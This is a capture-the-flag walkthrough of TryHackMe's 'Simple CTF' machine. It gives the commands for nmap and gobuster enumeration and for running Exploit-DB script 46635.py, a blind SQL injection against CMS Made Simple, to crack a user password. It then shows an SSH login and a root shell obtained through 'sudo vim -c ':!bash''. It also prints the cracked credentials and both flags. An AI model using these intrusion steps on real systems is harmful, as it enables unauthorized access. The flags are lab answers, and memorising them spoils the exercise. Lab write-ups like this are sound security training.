## TASK 1

> How many services are running under port 1000?
> 

so we will scan the target accordignly

we use this command == `nmap -sVC -Pn -oN intial_nmap [target_ip]`

so as we saw on the picture below there are 2 running service under port 1000 the other one is running on port 2222

![nmapResult.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/nmapResult.png)

> on this address we have found only 3 ports from their are 21,80,and 2222 
so we have only 2 ports running under port 1000
> 

## TASK 2

> What is running on the higher port?
> 

as we can see on our scanning result the higher port is 2222 so the service that is running on that port is `ssh`

## TASK 3

> What's the CVE you're using against the application?
> 

### Thanks to TryHackMe, we have a given hint:

Question Hint:

> An issue was discovered in **CMS Made Simple** 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.
> 

**method 1
according to the hint we will search it on google and we will get the bellow result**

![cmsMadeSimple-fotor-2025081191750.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/cmsMadeSimple-fotor-2025081191750.png)

### method 2
we can also get the full information using exploit DB offline in kali terminal  use command `searchsploit 'CMS made simple'`
this command will return the below result

![searchSploit.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/searchSploit.png)

the file name ‘[46635.py](http://46635.py/)’
after we got the file we will try to know the location of the file using the following command 

`locate '[46635.py](http://46635.py/)`'

![locationOfFile.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/locationOfFile.png)

This will give us the following result:

Location: /usr/share/exploitdb/exploits/php/webapps/46635.py

So in order to see the content of the file, we should copy the file path to our current directory using the `'cp /usr/share/exploitdb/exploits/php/webapps/46635.py .'` command.
Now we can access the file in our local directory.

## TASK 4

> To what kind of vulnerability is the application vulnerable?
> 

We have also the given hint we will use it to crack the password for task 5

================================================================
Question Hint

# You can use `/usr/share/seclists/Passwords/Common-Credentials/best110.txt` to crack the password

we should consider that the first above hint gives us the name of the vulnerability **`SQLI`**

## TASK 5

> What's the password?
> 

First we should enumerate the target if there is hidden files in that address we use gobuster command  

`┌──(selsu1865㉿kali)-[~/TryHackMe/SimpleCTF]
└─$ gobuster dir -u http://[given_ip] -w /usr/share/wordlists/dirb/common.txt`

so we will get the hidden folder named **“simple”**

![gobusterTofindHiddenFile.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/gobusterTofindHiddenFile.png)

on task 4 

Question Hint=============

You can use `/usr/share/seclists/Passwords/Common-Credentials/best110.txt` to crack the pass========

we have given hint to crack the password of the user:  so we will use the python that we found on ‘CMS made simple’ and the hidden folder we found on the server ‘**/simple’**

so we will run the below command to crack the password 

`python2.7 [46635.py](http://46635.py/) -u http://[given_ip]/simple -c -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`

![passwordUsernamefound.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/passwordUsernamefound.png)

we successfully found our credentials 

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: [admin@admin.com](mailto:admin@admin.com)
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: **secret**

## TASK 6

> Where can you login with the details obtained?
> 

after we found our credentials
username='mitch'
password='secret'
we can login remotely using secure shell === **`ssh`**

## TASK 7

What's the user flag?

to get the user flag we should access remote machine using the following command 

`ssh [mitch@](mailto:mitch@10.10.6.99)[given_ip] -p 2222` then enter the password of **'mitch'** to access the remote machine 

![userflag.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/userflag.png)

> userflag= `G00d j0b, keep up!`
> 

## TASK 8

> Is there any other user in the home directory? What's its name?
> 

check if there is other user in that machine
using the following command `cd /home`
then    `ls`
it result **mitch** and **sunbath**

so we will submit the other username **sunbath**

## TASK 9

> What can you leverage to spawn a privileged shell?
> 

we can leverage the spawn privileged shell with `vim`

## TASK 10

> what is the root flag ?
> 

First, we should run the '`sudo -l'` command to check what we are allowed to run on this remote machine. This will show us which executable commands we have permission to use.

> $ sudo -l
User mitch may run the following commands on Machine:
(root) NOPASSWD: /usr/bin/vim
> 

we should run the below command to be a root user of that remote machine
`sudo vim -c ':!bash'`

we have successfully accessed a root user and we can interact with the remote machine for unlimited operation

lets read the content of root.txt file to find our final flag

![finalFlags.png](SIMPLE-CTF%2024ab66e397c98063a592f7b5133d643c/finalFlags.png)

root flag == **W3ll d0n3. You made it!**
